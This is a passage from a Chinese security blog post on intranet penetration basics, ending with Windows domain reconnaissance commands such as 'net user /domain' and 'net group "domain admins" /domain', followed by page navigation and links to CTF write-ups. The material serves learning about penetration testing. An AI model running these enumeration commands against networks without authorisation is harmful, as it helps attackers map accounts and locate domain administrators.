+<p>net user /domain 查询域内用户，会看到熟悉的krbtgt用户</p>
+<p>wmic useraccount get /all 获取域内用户详细信息</p>
+<p>dsquery user 查看域内存在的用户</p>
+<p>net localgroup administrators 查看本地管理员用户组</p>
+<p>net group “domain admins” /domain 查询域管理员用户</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Kenoeee</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/06/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/">http://example.com/2022/06/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Kenoeee</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">-内网渗透</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/04/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AE%89%E5%85%A8/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/5.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctf中的php原生类技巧</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/" title="内网渗透探索"><img class="cover" src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-01</div><div class="title">内网渗透探索</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/20220128021634.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Kenoeee</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">内网渗透基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%90%8D%E8%AF%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">基础名词解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84-Work-Group"><span class="toc-number">1.1.1.</span> <span class="toc-text">工作组(Work Group)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F"><span class="toc-number">1.1.2.</span> <span class="toc-text">域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%9F%9F"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">单域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%B6%E5%9F%9F"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">父域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%A0%91"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">域树</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%A3%AE%E6%9E%97"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">域森林</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">DNS域名服务器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.3.</span> <span class="toc-text">活动目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E5%88%92%E5%88%86"><span class="toc-number">1.1.4.</span> <span class="toc-text">安全域划分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DMZ"><span class="toc-number">1.1.5.</span> <span class="toc-text">DMZ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%B8%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.6.</span> <span class="toc-text">域中服务器的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%9D%83%E9%99%90%E8%A7%A3%E8%AF%BB"><span class="toc-number">1.1.7.</span> <span class="toc-text">内权限解读</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E7%BB%84%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9A%84%E6%AF%94%E8%BE%83"><span class="toc-number">1.1.8.</span> <span class="toc-text">三种组作用域的比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AGDLP%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">1.1.9.</span> <span class="toc-text">AGDLP权限划分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#windows-server-2003"><span class="toc-number">1.2.0.1.0.1.</span> <span class="toc-text">windows server 2003</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#windows-server-2008"><span class="toc-number">1.2.0.1.0.2.</span> <span class="toc-text">windows server 2008</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">工作组信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">域信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#powershell%E6%94%B6%E9%9B%86%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.0.3.1.</span> <span class="toc-text">powershell收集域信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.0.3.2.</span> <span class="toc-text">敏感信息收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.2.0.3.3.</span> <span class="toc-text">定位域管理员</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/" title="教练，我要学内网（一）——内网渗透基础和信息收集"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="教练，我要学内网（一）——内网渗透基础和信息收集"/></a><div class="content"><a class="title" href="/2022/06/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/" title="教练，我要学内网（一）——内网渗透基础和信息收集">教练，我要学内网（一）——内网渗透基础和信息收集</a><time datetime="2022-06-01T16:00:00.000Z" title="发表于 2022-06-02 00:00:00">2022-06-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AE%89%E5%85%A8/" title="ctf中的php原生类技巧"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/5.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctf中的php原生类技巧"/></a><div class="content"><a class="title" href="/2022/04/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AE%89%E5%85%A8/" title="ctf中的php原生类技巧">ctf中的php原生类技巧</a><time datetime="2022-04-19T16:00:00.000Z" title="发表于 2022-04-20 00:00:00">2022-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/16/SimplePhp%E5%A4%8D%E7%8E%B0/" title="SWPUCTF 2018]SimplePHP复现"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/9_高清放大.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SWPUCTF 2018]SimplePHP复现"/></a><div class="content"><a class="title" href="/2022/04/16/SimplePhp%E5%A4%8D%E7%8E%B0/" title="SWPUCTF 2018]SimplePHP复现">SWPUCTF 2018]SimplePHP复现</a><time datetime="2022-04-15T16:00:00.000Z" title="发表于 2022-04-16 00:00:00">2022-04-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/13/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化初探"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="phar反序列化初探"/></a><div class="content"><a class="title" href="/2022/04/13/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化初探">phar反序列化初探</a><time datetime="2022-04-12T16:00:00.000Z" title="发表于 2022-04-13 00:00:00">2022-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/" title="内网渗透探索"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透探索"/></a><div class="content"><a class="title" href="/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/" title="内网渗透探索">内网渗透探索</a><time datetime="2022-02-28T16:00:00.000Z" title="发表于 2022-03-01 00:00:00">2022-03-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Kenoeee</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
